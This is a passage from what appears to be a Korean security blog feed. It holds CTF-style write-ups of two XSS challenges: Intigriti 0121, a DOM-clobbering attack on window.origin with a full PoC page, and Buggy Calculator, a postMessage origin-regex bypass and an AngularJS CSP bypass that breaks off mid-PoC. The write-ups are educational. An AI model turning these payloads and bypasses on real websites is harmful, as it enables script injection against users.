class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;error&quot;</span>).style.display = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">          &#125;, <span class="number">1000</span>);</span><br><span class="line">      &#125;, <span class="number">5000</span>);</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">&quot;popover&quot;</span>).innerHTML = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;p&gt;You&#x27;re being redirected to <span class="subst">$&#123;url&#125;</span> in 5 seconds...&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p id=&quot;error&quot; style=&quot;display:none&quot;&gt;</span></span><br><span class="line"><span class="string">          If you&#x27;re not being redirected, click &lt;a href=<span class="subst">$&#123;url&#125;</span>&gt;here&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/p&gt;.`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">&quot;Invalid URL.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>r</code>의 값이 존재하면 <code>safeRedirect</code> 함수를 호출하는 것을 볼 수 있다. <code>safeRedirect()</code>의 코드를 보면 일단 입력값에 꺽쇠, 싱글/더들 쿼터 및 공백이 없어야 한다. 만약 조건에 만족한다면 <code>setTimeout()</code> 함수를 이용해서 5초가 지낸 후 내부 코드가 실행 되도록 하고 있다. 그리고 그 5초 동안에는 밑에서 <code>popover</code>이라는 돔을 가져와서 해당 돔 내에 <code>a</code> 태그를 만들어주는 것을 볼 수 있다. 이는 비동기로 처리하지 않고 있기 때문에 5초가 지나 가든 말든 해당 코드가 실행 된 후에 위에 <code>setTimeout()</code> 함수 내부 로직이 실행된다.</p><p>내부 코드를 보면 입력값의 시작이 <code>https://</code>이면 그냥 입력 받은 <code>url</code>로 리다이렉트 시켜주는 것을 볼 수 있고, 만약 입력값의 시작이 <code>https://</code>가 아니라면 <code>window.origin + &quot;/&quot; + url;</code>으로 라디아렉트 시키는 것을 볼 수 있다. 아마 이 부분에서 <code>Dom Based XSS</code> 취약점이 발생하는 거 같고, <code>javascript</code> 스키마를 이용해서 트리거 해야 하는 거 같다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JaVascript:alrt(1)</span><br></pre></td></tr></table></figure><p>하지만 r의 값으로 위와 같이 보내줘도 결국에는 <code>window.origin</code>과 더하기 때문에 결과적으로 사용하는 값은 <code>https://challenge-0121.intigriti.io//JaVascript:alrt(1)</code>과 될 것 인데. 이는 뒤에 JS 스키마가 실행되지 않는다.</p><p>결국에는 <code>window.origin</code>의 값을 조작해야 한다. </p><ul><li>시나리오</li></ul><ol><li>window.origin을 삭제한다.<br></li><li>a 태그의 id 값으로 origin을 넣어준다.<br></li><li>그럼 window.origin의 값이 따로 정의 되어 있지 않다. 따라서 window.origin을 참조하게 되면 a 태그를 참조하게 되어 있다.</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> Del = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">delete</span> <span class="built_in">window</span>[<span class="string">&#x27;origin&#x27;</span>];</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;[+] Delete origin&#x27;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">onclick</span>=<span class="string">Del()</span> <span class="attr">value</span>=<span class="string">&#x27;Delete origin&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://pocas.kr&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;origin&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>일단 확인을 하기 위해 위와 같이 Test 코드를 작성해주었다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/Before%20delete.png?raw=true"></p><p>서버를 열고 접속 한 후에, <code>window.origin</code>을 입력하면 현재 오리진 주소가 나오는 것을 볼 수 있다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/After%20delete.png?raw=true"></p><p>그 후에 <code>Delete origin</code> 버튼을 눌러서 오리진을 삭제 한 후에, <code>window.origin</code>을 입력해 보니 <code>a</code> 태그를 참조하는 것을 볼 수 있다. 그럼 이제 <code>window.origin</code>을 어떻게 삭제할 지 생각해보아야 한다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/1.png?raw=true"></p><p>그래서 일단 위와 같이 <code>forEach</code> 문에 브레이크 포인트를 걸고, 어떤 값들을 검증하는 지 확인하기로 했다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/2.png?raw=true"></p><p>코드를 복사해서 확인을 해보니 해당 객체 내에 있는 모든 내부 객체들을 확인하는 것을 볼 수 있었고, 여기서 origin이 들어있는 내부 객체들도 몇 보였다. 즉, 오리진이 들어 있는 내부 객체를 모두 삭제 시키면 <code>window.origin</code>의 값을 삭제시킬 수 있을 거 같았다. 그러니 <code>origin</code>에 <code>&quot;javascript&quot;</code>라는 문자열을 넣은 후에 요청을 보내면 될 거 같다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;*.challenge-0121.intigriti.io&#x2F;</span><br></pre></td></tr></table></figure><p>하지만 그냥 보내주면 <code>domain</code> 인식을 못 할 거 같았는데, 위와 같이 라우팅이 되어 있어 앞 부분에 어떤 값을 넣어줘도 <code>https://challenge-0121.intigriti.io/</code>로 요청이 가게 되어 있었다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/3.png?raw=true"></p><p>그래서 <code>script.js</code> 11번째 라인에 브레이크 포인트를 걸고, <code>javascript.challenge-0121.intigriti.io/</code>로 요청을 보내 준 후에 포문이 끝나고, <code>window.origin</code>의 값을 확인해보니 <code>undefined</code>인 것을 확인 할 수 있었다.</p><p>그럼 이제 <code>window.origin</code>을 긁어 오게 되면 따로 정의가 되어 있지 않아 다른 값을 참아 참조하게 된다. </p><p>여기까지 분석을 통해서 익스의 필요한 모든 요소들을 확인할 수 있었다. <code>window.origin</code>이 a 태그를 참조하게 해서, <code>a</code> 태그의 들어 있는 <code>href</code>로 리다이렉트 시키면 된다. 또한 <code>a</code> 태그는 <code>setTimeout(&#39;~&#39;, 5000)</code>이 실행되면 그 5초 동안 밑에서 우리가 입력한 값을 <code>a</code> 태그의 <code>href</code> 속성으로 넣어주는 것을 볼 수 있다.</p><p>그렇기에 <code>setTimeout()</code> 함수 내부에서 <code>window.origin</code>을 긁어 올 때는, 이미 우리가 <code>a</code> 태그를 생성한 후 이기 때문에 <code>a</code> 태그의 <code>href</code>를 잘 긁어올 수 있을 것이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r Parameter : Javascript:alert(document.domain)&#x2F;%00id&#x3D;origin</span><br><span class="line">Result : &lt;a href&#x3D;&#39;Javascript:alert(document.domain)&#x2F;&#39;%00id&#x3D;&#39;origin&#39;&gt;</span><br></pre></td></tr></table></figure><p>그래서 일단 위와 같이 r의 값으로 보내주었다. <code>%00</code>을 준 이유는 <code>href</code> 속성과 <code>id</code> 속성을 분류하기 위해서 이고, <code>%20</code>이 아닌 널 바이트를 준 이유는 공백은 필터링을 하고 있기 때문이다. 그럼 위와 같이 <code>a</code> 태그가 생성이 될 것 이고, 5초가 지나면 <code>window.origin + &#39;/&#39; + url</code>에 의해서 <code>Javascript:alert(document.domain)//Javascript:alert(document.domain)/%00id=origin</code>가 될 것이다. 그리고 여기서 r의 값에서 alert() 함수 뒤에 슬래쉬를 넣어준 이유는 JS 문법 에러를 피하기 위해서다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/4.png?raw=true"></p><p>하지만 ㅋㅋ 위와 같이 널 바이트가 바이트 값 그대로 들어가서 잘 안 된 것을 볼 수 있다.. 그래서 그냥 SQLI에서 사용되는 공백 바이패스로 <code>%0a</code>나 <code>%09</code>를 이용 하기로 했다. </p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/5.png?raw=true"></p><p>%09나 %0a로 해주니 잘 들어갔다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Intigriti%200121/images/6.png?raw=true"></p><p>그리고 5초를 기대려 주니 <code>setTimeout()</code> 함수에 내부 로직이 실행되어 XSS가 트리거 되었다.</p><hr><h2 id="Poc-Sollution"><a href="#Poc-Sollution" class="headerlink" title="Poc (Sollution)"></a>Poc (Sollution)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Intigriti 0121 Poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> poc = <span class="string">&#x27;Javascript:alert(document.domain)/%0aid=origin&#x27;</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> url = <span class="string">`https://javascript.challenge-0121.intigriti.io/?r=<span class="subst">$&#123;poc&#125;</span>`</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> exploit = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">window</span>.open(url);</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Intigriti XSS Challenge 0121<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>If you click the button below and execute poc code, You can trigger the xss.<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">exploit()</span> <span class="attr">value</span>=<span class="string">&quot;Trigger&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/ko/docs/Web/API/URL/searchParams">https://developer.mozilla.org/ko/docs/Web/API/URL/searchParams</a><br><br><a href="https://stackoverflow.com/questions/55451493/what-is-window-origin">https://stackoverflow.com/questions/55451493/what-is-window-origin</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buggy Calculator Write Up</title>
      <link href="2021/06/11/2021-06-11-Buggy-Calculator/"/>
      <url>2021/06/11/2021-06-11-Buggy-Calculator/</url>
      
        <content type="html"><![CDATA[<h2 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h2><p>Buggy Calculator 문제는 CSP 및 SOP를 우회하고 XSS를 트리거 하는 문제이다.</p><hr><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/1.png?raw=true"></p><p>문제로 들어오면 위와 같이 계산기가 있는 것을 볼 수 있고, 우리가 일반적으로 사용하는 방식과 동일하고, 숫자 및 연산자를 제외한 값들은 사용할 수 없다. 일단 여기에서는 따로 할 수 있거나 알 수 있는 게 없기 때문에 코드를 확인 해 보기로 했다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-eval&#x27; &#x27;self&#x27;; object-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>일단 코드를 보니 제일 위에 <code>meta</code>를 이용해서 <code>CSP</code>를 설정하고 있는 것을 볼 수 있다. CSP가 설정이 되어 있기 때문에 <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>와 같은 태그들을 이용해서 XSS 익스 시도를 할 수 있지만 CSP에 의해서 스크립트 실행은 되지 않을 것 이다. 그렇기 때문에 일단 해야 할 것 중 하나는 CSP 우회이다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>밑으로 가서 코드를 확인해 보니 위와 같이 리소스 파일을 랜더링 하는 것을 볼 수 있다. 여기서 중요한 부분은 <code>angular.min.js</code> 파일을 랜더링 해온다는 것 이다. <code> AngularJS</code>에서 사용되는 가젯들을 이용해서 XSS 익스를 시도할 수 있는데, 이를 이용하면 <code>CSP</code>를 쉽게 우회할 수 있을 거 같다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> AngularJS v1.5.6</span><br><span class="line"> (c) 2010-2016 Google, Inc. http:&#x2F;&#x2F;angularjs.org</span><br><span class="line"> License: MIT</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p><code> AngularJS</code>의 버전을 확인해 보니 <code>1.5.6</code>인 것을 볼 수 있다. 버전마다 사용하는 가젯이 다르기 때문에 이제 해당 버전을 기반으로 해서 XSS 페이로드를 찾으면 된다. 나는 Owasp PDF에서 찾았다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendEquation</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">theiframe.postMessage(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;theiframe&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:65px;width:100%; left:-100px; margin-top:-05px;margin-bottom:-30px;&quot;</span> <span class="attr">frameBorder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">src</span>=<span class="string">&quot;frame.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>위 리소스 파일들을 보면 <code>script.js</code> 파일도 랜더링 하는 것을 볼 수 있는데, 코드를 확인해보면 제일 밑에 위와 같이 <code>theiframe</code>라는 <code>iframe</code>으로 <code>postMessage</code> 메서드를 이용해서 값을 전달해주는 것을 볼 수 있고, 코드를 보면 위와 같이 <code>frame.html</code>을 끌어와서 사용하는 것도 볼 수 있다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-eval&#x27; &#x27;self&#x27;; object-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&#x27;https://fonts.googleapis.com/css?family=Ubuntu:400,700&#x27;</span> <span class="attr">rel</span>=<span class="string">&#x27;stylesheet&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;text/css&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">html &#123;</span><br><span class="line">clear: both;</span><br><span class="line">font-family: digital;</span><br><span class="line">font-size: 24px;</span><br><span class="line">text-align: right;</span><br><span class="line">letter-spacing: 5px;</span><br><span class="line">    font-family: &#x27;Ubuntu&#x27;, sans-serif;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">0</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>위 코드는 <code>frame.html</code>의 코드인데 잘 보면 <code>frame.js</code>를 끌어와서 사용하는 것을 볼 수 있다. 지금까지 분석을 통해서 알 수 있는 건 게산기를 통해서 <code>1+1</code>을 입력 받고, 이를 <code>postMessage</code> 메서드를 이용해서 <code>frame.html</code>로 전달 하고, <code>frame.js</code>에서 특정 로직을 거치고 <code>&lt;body&gt;</code>의 삽입하는 거 같다. 즉, 우리가 원하는 값을 <code>body</code>의 삽입할 수 있으면 XSS 트리거를 할 수 있다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/2.png?raw=true"></p><p>즉, 위 부분이 <code>frame.html</code>이라고 봐도 무방하다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, receiveMessage, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// verify sender is trusted</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="regexp">/^http:\/\/calc.buggywebsite.com/</span>.test(event.origin)) &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// display message </span></span><br><span class="line">msg = event.data;</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="string">&#x27;off&#x27;</span>) &#123;</span><br><span class="line"><span class="built_in">document</span>.body.style.color = <span class="string">&#x27;#95A799&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (msg == <span class="string">&#x27;on&#x27;</span>) &#123;</span><br><span class="line"><span class="built_in">document</span>.body.style.color = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!msg.includes(<span class="string">&quot;&#x27;&quot;</span>) &amp;&amp; !msg.includes(<span class="string">&quot;&amp;&quot;</span>)) &#123;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=msg;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드는 <code>frame.js</code>의 코드이다. 잘 보면 <code>postMessage</code> 메서드로 전달 받은 값을 <code>receiveMessage</code> 메서드로 받고, 처리하는 것을 볼 수 있다. 이때 조건문을 이용해서 origin을 확인하는 것을 볼 수 있다. 즉, 해당 프레임으로 요청을 보낼 수 있는 건 <code>http://calc.buggywebsite.com</code>라는 오리진을 가진 애들이다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="regexp">/^http:\/\/calc.buggywebsite.com/</span>.test(<span class="string">&quot;http://calc.buggywebsite.com.example.com&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Same Origin Plz..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&gt; <span class="literal">undefined</span></span><br></pre></td></tr></table></figure><p>조건문을 위와 같이 확인을 해보면 정규식이 <code>^</code> 이기 때문에 <code>http://calc.buggywebsite.com.example.com</code>와 같은 오리진을 가진 사이트에서 요청을 보내줘도 필터링에 걸리지 않는 것을 볼 수 있다. <code>https://bugpoc.com/</code> 에서 프론트 엔드를 원하는 오리진으로 생성할 수 있는데 이를 이용해서 poc 코드를 올려주게 되면 위 구문은 쉽게 우회할 수 있다.</p><p>그리고 오리진 검사 로직을 통과하게 되면 msg 값을 조건문을 상황에 맞게 실행시키는 것을 볼 수 있는데, 여기서 제일 밑 조건문 내부를 보면 msg의 값을 innserHTML 메서드를 이용해서 돔 내부에 삽입하는 것을 볼 수 있는데 HTML 5에서는 innserHTML의 값으로 <code>&lt;script&gt;</code>가 들어오게 되면 스크립트 태그를 실행시키지 않기 때문에 <code>&lt;script&gt;</code> 태그를 제외한 나머지 태그를 이용해서 XSS 트리거를 해야 한다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/3.png?raw=true"></p><p>그래서 이미지 태그를 이용해서 XSS를 트리거 하려 했지만 frame.html에도 csp가 설정이 되어 있어 csp에 걸리는 것을 볼 수 있다. 결국에는 AngularJS 가젯을 이용해서 XSS를 트리거 해야 하는데 <code>frame.html</code>에는 <code>angular.min.js</code> 파일이 랜더링 되어 있지 않기 때문에 <code>&lt;script&gt;</code> 태그를 이용해서 불러와줘야 한다. 그치만 우리는 <code>&lt;script&gt;</code> 태그를 사용할 수 없다.</p><p>하지만 <code>&lt;iframe&gt;</code> 태그의 srcdoc 속성을 이용해서 프레임 내에 <code>&lt;script&gt;</code> 태그를 이용하면 iframe 내부에서 별도로 코드를 실행 시키기 때문에 이를 우회하고 스크립트 태그를 실행 시킬 수 있다. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script src=/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;&#123;&#123; 7*7 &#125;&#125;&lt;/div&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>그래서 위와 같이 페이로드를 작성해주었다. socdoc를 보면 <code>&lt;script&gt;</code> 태그를 이용해서 앵귤러 파일을 랜더링 해준 후에 앵귤러 표현식을 이용해 주었다. <code>&lt;div&gt;</code> 태그의 들어 있는 <code>ng-app</code>은 이 태그를 기준으로 앵귤러를 사용하겠다는 지시문이다. </p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/4.png?raw=true"></p><p>돔으로 넣어주니 iframe 내에서 스크립트 태그가 잘 실행 됐고, 앵귤러 표현식도 잘 되는 것을 볼 수 있었다.</p><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/5.png?raw=true"></p><p>이제 앵귤러 표현식으로 가젯을 이용해서 alert() 함수를 실행 시켜 주면 된다. 가젯을 이용한 XSS Poc 코드는 <a href="https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf">Owasp</a>에서 확인할 수 있었다. </p><hr><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><img src="https://github.com/wjddnjs33/Poc/blob/main/wargame/xss%20challenge/Buggy%20Calculator/images/trigger.gif?raw=true"></p><hr><h2 id="Poc-Sollution"><a href="#Poc-Sollution" class="headerlink" title="Poc (Sollution)"></a>Poc (Sollution)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Poc XSS about Calculate<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    